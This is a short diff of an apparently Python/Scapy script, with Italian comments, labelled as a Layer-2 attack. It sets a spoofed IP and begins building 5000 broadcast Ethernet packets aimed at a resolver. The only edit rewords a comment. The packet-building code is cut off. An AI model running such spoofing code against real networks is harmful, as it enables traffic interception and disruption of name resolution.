@@ -10,7 +10,7 @@ fake_ip = "172.20.0.80"
 
 print(f"[*] ATTACCO L2: {master_to_spoof} -> {resolver_ip}")
 
-# Generiamo 5000 varianti per massimizzare la velocità
+# Generazione 5000 varianti per massimizzare la velocità
 pkts = []
 for _ in range(5000):
     p = Ether(dst="ff:ff:ff:ff:ff:ff") / \
